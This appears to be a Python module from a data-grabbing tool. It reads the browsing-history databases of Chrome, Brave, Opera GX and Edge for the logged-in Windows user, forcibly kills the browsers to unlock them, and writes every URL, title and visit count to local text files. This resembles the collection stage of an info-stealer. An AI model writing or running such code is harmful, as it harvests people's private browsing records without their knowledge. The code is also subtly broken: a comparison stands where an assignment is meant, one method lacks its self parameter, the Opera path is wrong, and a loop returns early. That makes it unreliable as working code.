import os, sqlite3, psutil

class SearchHistory():
    def __init__(self):
        self.user = self.get_user()
        self.database = None
        self.filedirs = [
    f"C:\\Users\\{self.get_user()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
    f"C:\\Users\\{self.get_user()}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History",
    f"C:\\Users\\{self.get_user()}\\Roaming\\Opera Software\\Opera GX Stable\\History",
    f"C:\\Users\\{self.get_user()}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"]

    def get_user(self):
        return os.getlogin()

    def kill_process(process_name: str):
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == process_name.lower():
                psutil.Process(proc.info['pid']).kill()
                return True
        return False

    def is_app_running(self, app_name: str):
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] == app_name.lower():
                return True
        return False

    def execute(self):
        data = []
        looped = 0
        if self.database == "all":
            while looped < 4:
                self.database = self.filedirs[0+looped]
                looped += 1
                con = sqlite3.connect(self.database)
                cur = con.cursor()
                cur.execute("select url, title, visit_count from urls")

                results = cur.fetchall()
                for result in results:
                    url, title, visit_count = result
                    data_bundle = f"{title}\nVisits: {visit_count}\n{url}\n\n"
                    data.append(data_bundle)
        else:
            con = sqlite3.connect(self.database)
            cur = con.cursor()
            cur.execute("select url, title, visit_count from urls")

            results = cur.fetchall()
            for result in results:
                url, title, visit_count = result
                data_bundle = f"{title}\nVisits: {visit_count}\n{url}\n\n"
                data.append(data_bundle)
        return data

    def get_all(self):
        for filedir in self.filedirs:
            if os.path.exists(filedir):
                self.database == "all"
                
                if self.is_app_running("google chrome"):
                    self.kill_process("google chrome")
                if self.is_app_running("brave browser"):
                    self.kill_process("brave browser")
                if self.is_app_running("opera internet browser"):
                    self.kill_process("opera internet browser")
                if self.is_app_running("microsoft edge"):
                    self.kill_process("microsoft edge")

                data = self.execute()
                with open("files\\history.txt", "a") as file:
                    for bundle in data:
                        file.write(bundle)
            return True, "files\\history.txt"
        else:
            return None
        
    def get_chrome(self):
        if os.path.exists(self.filedirs[0]):
            self.database = self.filedirs[0]
            data = self.execute()
            with open("files\\history-chrome.txt", "a") as file:
                for bundle in data:
                    file.write(bundle)
            return True, "files\\history-chrome.txt"
        else:
            return None
    
    def get_brave(self):
        if os.path.exists(self.filedirs[1]):
            self.database = self.filedirs[1]
            data = self.execute()
            with open("files\\history-brave.txt", "a") as file:
                for bundle in data:
                    file.write(bundle)
            return True, "files\\history-brave.txt"
        else:
            return None
    
    def get_opera(self):
        if os.path.exists(self.filedirs[2]):
            self.database = self.filedirs[2]
            data = self.execute()
            with open("files\\history-opera.txt", "a") as file:
                for bundle in data:
                    file.write(bundle)
            return True, "files\\history-opera.txt"
        else:
            return None
    
    def get_edge(self):
        if os.path.exists(self.filedirs[3]):
            self.database = self.filedirs[3]
            data = self.execute()
            with open("files\\history-edge.txt", "a") as file:
                for bundle in data:
                    file.write(bundle)
            return True, "files\\history-edge.txt"
        else:
            return None